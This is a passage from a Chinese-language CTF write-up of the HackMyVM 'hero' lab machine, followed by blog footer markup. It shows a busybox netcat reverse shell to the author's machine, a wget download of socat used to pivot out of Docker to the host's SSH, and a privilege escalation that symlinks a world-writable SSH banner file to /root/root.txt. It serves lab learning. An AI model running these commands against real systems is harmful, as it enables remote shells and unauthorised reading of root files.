+<p><strong>上去执行了两个命令，发现用户是node，看了一下ip，是172.17.0.2&#x2F;16，那肯定是docker内部了，然后我反弹shell，一直不成功，根据一些报错信息，我发现没&#x2F;bin&#x2F;bash，是&#x2F;bin&#x2F;sh，奇了怪了，换了&#x2F;bin&#x2F;sh还是不成功，直接炸了，看wp，人家用 BusyBox执行的，说实话，完全不知道啥东西，就百度了一下用上了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox nc 192.168.134.141 4444 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>busybox是一个轻量的工具集，支持很多命令，这就直接能反弹shell到我们的机器了</strong></p>
+<p><strong>我呢，看了别人的wp，走了第一条路，直接反弹获得了一个shawa的shell，走第二条路呢，获得的是node用户，在docker里面，当然，都一样的</strong></p>
+<p><img src="/2025/04/18/hack-my-vm-hero/4.png" alt="4"></p>
+<p><strong>调出这个界面，方法就是直接搜ssh，就能看见了，这里发现有nc，所以反弹成功了，但是拿到的shell不稳定，这里就学习了一手别人拿稳定性shell的方法</strong></p>
+<h2>提权</h2>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget  http://192.168.134.141:8000/socat</span><br><span class="line">ls</span><br><span class="line">socat</span><br><span class="line">user.txt</span><br><span class="line">chmod +x socat</span><br><span class="line">./socat TCP-LISTEN:6666,fork TCP4:172.17.0.1:22 &amp;</span><br><span class="line">netstat -tuln</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:6666            0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 172.17.0.1:22           0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 :::5678                 :::*                    LISTEN</span><br><span class="line">tcp        0      0 :::80                   :::*                    LISTEN</span><br></pre></td></tr></table></figure>
+
+<p><strong>学习别人的思路，用静态编译的socat监听本地的6666端口，把数据转发到172.17.0.1:22，所以我们外面直接连接即可</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ssh shawa@192.168.134.122 -p 6666  -i id_rsa_hero                                          [21:33:52]</span><br><span class="line">shawa was here.</span><br><span class="line">Welcome to Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki contains a large amount of how-to guides and general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;https://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup the system with the command: setup-alpine</span><br><span class="line"></span><br><span class="line">You may change this message by editing /etc/motd.</span><br><span class="line"></span><br><span class="line">hero:~$ ls</span><br><span class="line">socat     user.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个是ssh的配置文件，里面有这样的代码</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Banner /opt/banner.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>意思是：当有人通过 SSH 登录你的服务器时，在他们输入用户名&#x2F;密码之前，显示 &#x2F;opt&#x2F;banner.txt文件里的内容。</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">drw-rw-rwx    3 root     root          4096 Apr 18 13:45 opt</span><br><span class="line">hero:/opt$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drw-rw-rwx    3 root     root          4096 Feb  6 10:14 .</span><br><span class="line">drwxr-xr-x   21 root     root          4096 Feb  6 10:03 ..</span><br><span class="line">-rw-rw-rw-    1 root     root            16 Feb  6 10:09 banner.txt</span><br><span class="line">drwx--x--x    4 root     root          4096 Feb  6 10:14 containerd</span><br></pre></td></tr></table></figure>
+
+<p><strong>操作这文件，我们权限很大</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hero:/opt$ rm banner.txt</span><br><span class="line">hero:/opt$ ls</span><br><span class="line">containerd</span><br><span class="line">hero:/opt$ ln -s /root/root.txt /opt/banner.txt</span><br><span class="line">hero:/opt$ ls</span><br><span class="line">banner.txt  containerd</span><br><span class="line">hero:/opt$</span><br></pre></td></tr></table></figure>
+
+<p><strong>重新远程连接就能拿到flag</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">VHub</a></li>
+         
+          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm:hero</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">服务渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/18/hack-my-vm-hero/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/18/hack-my-vm-hero/&text=hack-my-vm:hero"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/18/hack-my-vm-hero/&is_video=false&description=hack-my-vm:hero"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm:hero&body=Check out this article: http://example.com/2025/04/18/hack-my-vm-hero/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/18/hack-my-vm-hero/&name=hack-my-vm:hero&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/18/hack-my-vm-hero/&t=hack-my-vm:hero"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">VHub</a></li>
+         
+          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
